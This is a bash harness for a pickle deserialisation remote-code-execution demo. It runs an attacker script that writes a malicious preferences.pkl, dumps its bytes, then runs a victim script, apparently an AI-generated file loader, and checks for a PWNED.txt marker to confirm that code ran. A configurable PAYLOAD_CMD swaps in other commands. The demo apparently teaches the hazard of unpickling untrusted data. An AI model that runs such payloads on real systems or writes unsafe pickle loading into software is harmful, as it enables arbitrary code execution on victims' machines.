#!/usr/bin/env bash
# Runs the pickle-RCE demo end-to-end with a marker-file proof.
#
# Usage:
#   ./run-demo.sh                          # default: marker-file proof
#   PAYLOAD_CMD='open -a Calculator' ./run-demo.sh   # macOS stage variant
#
# Run from this directory.

set -e

cd "$(dirname "$0")"

# Locate the project venv. Default: walk up from this script.
PYTHON="${PYTHON:-../../venv/bin/python}"
if [ ! -x "$PYTHON" ]; then
    echo "Error: cannot find project venv python at $PYTHON" >&2
    echo "Set PYTHON=/path/to/python or create venv at <repo-root>/venv" >&2
    exit 1
fi

MARKER=PWNED.txt
PKL=preferences.pkl

echo "=== Pre-check: marker file should not exist ==="
rm -f "$MARKER" "$PKL"
if [ -f "$MARKER" ]; then
    echo "  FAIL: marker still exists after rm" >&2
    exit 1
fi
echo "  ok, no marker, no preferences.pkl"
echo

echo "=== Step 1: attacker writes preferences.pkl ==="
"$PYTHON" attacker.py
echo

echo "=== Step 2: bytes inside preferences.pkl (note 'posix system' visible in plaintext) ==="
xxd "$PKL" | head -3
echo

echo "=== Step 3: victim runs the AI-generated load_from_file() ==="
"$PYTHON" victim.py
echo

echo "=== Step 4: post-check — did arbitrary code execute? ==="
if [ -f "$MARKER" ]; then
    echo "  RCE CONFIRMED. Marker file contents:"
    sed 's/^/    /' "$MARKER"
else
    echo "  No marker file — RCE did NOT execute (or PAYLOAD_CMD did not write to ./$MARKER)"
fi
